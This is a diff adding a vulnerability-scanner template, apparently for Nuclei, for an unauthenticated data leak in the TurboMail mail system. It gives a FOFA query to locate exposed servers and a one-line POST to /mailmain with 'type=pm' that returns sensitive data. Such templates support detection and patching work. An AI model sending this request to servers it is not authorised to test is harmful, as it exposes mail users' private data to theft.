@@ -1,0 +1,27 @@
+id: turbomail-mailmain-info-leak
+
+info:
+  name: "TurboMail mailmain 接口 pm 方法未授权访问敏感信息泄露"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: app="TurboMail" || body="maintlogin.jsp" || body="tmw/1/getpassword.jsp"
+          TurboMail邮件系统的mailmain接口内嵌的pm方法未实施有效身份验证机制，远程攻击者可通过构造特定请求直接访问该接口，从而获取存储在系统内的用户敏感数据。该安全缺陷可能为后续横向渗透攻击提供初始突破口。
+  tags: TurboMail
+
+http:
+- raw:
+  - |
+    POST /mailmain HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    type=pm
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'SessinonAdmin'
